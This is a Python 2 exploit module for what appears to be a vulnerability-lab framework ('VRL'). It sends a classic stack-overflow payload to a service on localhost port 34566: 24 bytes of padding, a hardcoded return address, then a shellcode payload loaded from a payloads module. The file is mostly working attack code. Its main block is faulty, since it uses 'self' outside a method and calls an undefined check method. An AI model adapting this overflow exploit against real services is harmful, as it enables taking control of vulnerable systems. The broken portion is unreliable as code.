#! /usr/bin/python
#coding:utf-8
import socket
import struct
import sys
sys.path.append("../..")
from payloads import *
from modules import exploit

class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'stack_overflow'
        self.payload = ''
        self.info = {'ret':0x00007fffffffda70, 'offset':24}
        self.options={'dIP' : '127.0.0.1',
                      'dPort':'34566',
                      'default_payload':"payload1"}
        self.vulnerability= 'stack_overflow'

    def run(self):
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['dPort'])))
        ret_addr = struct.pack('<Q', self.info['ret'])
        data = 'A' * self.info['offset'] + ret_addr + self.payload
        #print payload.data
        #print data
        s.send(data)
        s.close()

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    exp = Exploit()
    payload = eval(self.options['default_payload']).Payload()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()


